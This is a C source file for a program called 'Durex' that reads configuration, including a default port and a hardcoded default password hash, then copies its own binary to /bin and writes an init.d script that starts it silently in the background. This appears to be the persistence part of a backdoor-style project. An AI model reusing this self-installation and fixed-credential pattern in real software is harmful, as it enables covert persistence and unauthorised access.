#include "durex.h"
#include "sha256.h"

#include <errno.h>
#include <pwd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

static void join_path(char *dst, size_t size, const char *prefix, const char *suffix)
{
    size_t len;

    if (!prefix || !*prefix || strcmp(prefix, "/") == 0)
    {
        snprintf(dst, size, "%s", suffix);
        return ;
    }
    len = strlen(prefix);
    if (prefix[len - 1] == '/')
        snprintf(dst, size, "%s%s", prefix, suffix[0] == '/' ? suffix + 1 : suffix);
    else
        snprintf(dst, size, "%s%s", prefix, suffix);
}

static void copy_hash(char dst[DUREX_PASSWORD_HASH_LENGTH + 1], const char *src)
{
    size_t len;

    len = strlen(src);
    if (len != DUREX_PASSWORD_HASH_LENGTH)
    {
        memset(dst, 0, DUREX_PASSWORD_HASH_LENGTH + 1);
        return ;
    }
    for (size_t i = 0; i < len; ++i)
    {
        char c = src[i];
        if (!((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')))
        {
            memset(dst, 0, DUREX_PASSWORD_HASH_LENGTH + 1);
            return ;
        }
    }
    strncpy(dst, src, DUREX_PASSWORD_HASH_LENGTH);
    dst[DUREX_PASSWORD_HASH_LENGTH] = '\0';
}

static void hash_password(const char *password, char dst[DUREX_PASSWORD_HASH_LENGTH + 1])
{
    uint8_t digest[SHA256_DIGEST_LENGTH];
    char    tmp[65];

    sha256_compute((const uint8_t *)password, strlen(password), digest);
    sha256_hex(digest, tmp);
    strncpy(dst, tmp, DUREX_PASSWORD_HASH_LENGTH);
    dst[DUREX_PASSWORD_HASH_LENGTH] = '\0';
}

int durex_load_config(t_durex_config *cfg, const char *self_path)
{
    const char  *prefix;
    const char  *env;
    char        path_buffer[1024];

    memset(cfg, 0, sizeof(*cfg));
    cfg->allow_non_root = (geteuid() == 0);
    env = getenv("DUREX_ALLOW_UNSAFE");
    if (env && strcmp(env, "1") == 0)
        cfg->allow_non_root = 1;
    cfg->is_64bit = sizeof(void *) == 8;

    prefix = getenv("DUREX_PREFIX");
    if (prefix == NULL || *prefix == '\0')
        prefix = "/";
    cfg->prefix = prefix;

    join_path(path_buffer, sizeof(path_buffer), prefix, "/bin/Durex");
    cfg->binary_path = strdup(path_buffer);
    join_path(path_buffer, sizeof(path_buffer), prefix, "/etc/init.d/Durex");
    cfg->service_path = strdup(path_buffer);
    join_path(path_buffer, sizeof(path_buffer), prefix, "/var/run/Durex.pid");
    cfg->pid_path = strdup(path_buffer);
    join_path(path_buffer, sizeof(path_buffer), prefix, "/var/log/Durex.log");
    cfg->log_path = strdup(path_buffer);
    cfg->service_name = "Durex";

    cfg->port = DUREX_DEFAULT_PORT;
    env = getenv("DUREX_PORT");
    if (env)
    {
        int port = atoi(env);
        if (port > 0 && port < 65536)
            cfg->port = port;
    }

    strncpy(cfg->password_hash,
        "ff98ce4ca4a10a22df9d9b7b7e948257be7915b050d9186de5bf882f078a6bce",
        DUREX_PASSWORD_HASH_LENGTH);
    cfg->password_hash[DUREX_PASSWORD_HASH_LENGTH] = '\0';

    env = getenv("DUREX_PASSWORD_HASH");
    if (env && *env)
    {
        char tmp[DUREX_PASSWORD_HASH_LENGTH + 1];

        copy_hash(tmp, env);
        if (tmp[0])
            strncpy(cfg->password_hash, tmp, DUREX_PASSWORD_HASH_LENGTH);
    }
    env = getenv("DUREX_PASSWORD");
    if (env && *env)
        hash_password(env, cfg->password_hash);

    (void)self_path;
    return (0);
}

static int mkdir_p(const char *path)
{
    char    tmp[1024];
    size_t  len;

    snprintf(tmp, sizeof(tmp), "%s", path);
    len = strlen(tmp);
    if (len == 0)
        return (0);
    if (tmp[len - 1] == '/')
        tmp[len - 1] = '\0';
    for (char *p = tmp + 1; *p; ++p)
    {
        if (*p == '/')
        {
            *p = '\0';
            if (mkdir(tmp, 0755) == -1 && errno != EEXIST)
                return (-1);
            *p = '/';
        }
    }
    if (mkdir(tmp, 0755) == -1 && errno != EEXIST)
        return (-1);
    return (0);
}

static void mkdir_parent(const char *path)
{
    char buffer[1024];
    const char *slash;

    snprintf(buffer, sizeof(buffer), "%s", path);
    slash = strrchr(buffer, '/');
    if (!slash)
        return ;
    buffer[slash - buffer] = '\0';
    mkdir_p(buffer);
}

static int copy_binary(const char *src, const char *dst)
{
    FILE    *in;
    FILE    *out;
    char    buffer[4096];
    size_t  n;

    in = fopen(src, "rb");
    if (!in)
        return (-1);
    mkdir_parent(dst);
    out = fopen(dst, "wb");
    if (!out)
    {
        fclose(in);
        return (-1);
    }
    while ((n = fread(buffer, 1, sizeof(buffer), in)) > 0)
    {
        if (fwrite(buffer, 1, n, out) != n)
        {
            fclose(in);
            fclose(out);
            return (-1);
        }
    }
    fclose(in);
    fclose(out);
    chmod(dst, 0755);
    return (0);
}

static int write_service(const t_durex_config *cfg)
{
    FILE    *f;

    mkdir_parent(cfg->service_path);
    f = fopen(cfg->service_path, "w");
    if (!f)
        return (-1);
    fprintf(f, "#!/bin/sh\n");
    fprintf(f, "case \"$1\" in\n");
    fprintf(f, "    start)\n");
    fprintf(f, "        nohup %s >/dev/null 2>&1 &\n", cfg->binary_path);
    fprintf(f, "        ;;\n");
    fprintf(f, "    stop)\n");
    fprintf(f, "        if [ -f %s ]; then\n", cfg->pid_path);
    fprintf(f, "            kill `cat %s` 2>/dev/null\n", cfg->pid_path);
    fprintf(f, "            rm -f %s\n", cfg->pid_path);
    fprintf(f, "        fi\n");
    fprintf(f, "        ;;\n");
    fprintf(f, "    *)\n");
    fprintf(f, "        echo \"Usage: $0 {start|stop}\"\n");
    fprintf(f, "        exit 1\n");
    fprintf(f, "        ;;\n");
    fprintf(f, "esac\n");
    fclose(f);
    chmod(cfg->service_path, 0755);
    return (0);
}

int durex_install(const t_durex_config *cfg, const char *self_path)
{
    char        pid_dir[1024];
    char        log_dir[1024];
    const char  *last;

    if (copy_binary(self_path, cfg->binary_path) == -1)
        fprintf(stderr, "[durex] warning: failed to copy binary to %s\n", cfg->binary_path);
    if (write_service(cfg) == -1)
        fprintf(stderr, "[durex] warning: failed to create service at %s\n", cfg->service_path);

    snprintf(pid_dir, sizeof(pid_dir), "%s", cfg->pid_path);
    last = strrchr(pid_dir, '/');
    if (last)
    {
        pid_dir[last - pid_dir] = '\0';
        mkdir_p(pid_dir);
    }
    snprintf(log_dir, sizeof(log_dir), "%s", cfg->log_path);
    last = strrchr(log_dir, '/');
    if (last)
    {
        log_dir[last - log_dir] = '\0';
        mkdir_p(log_dir);
    }
    return (0);
}
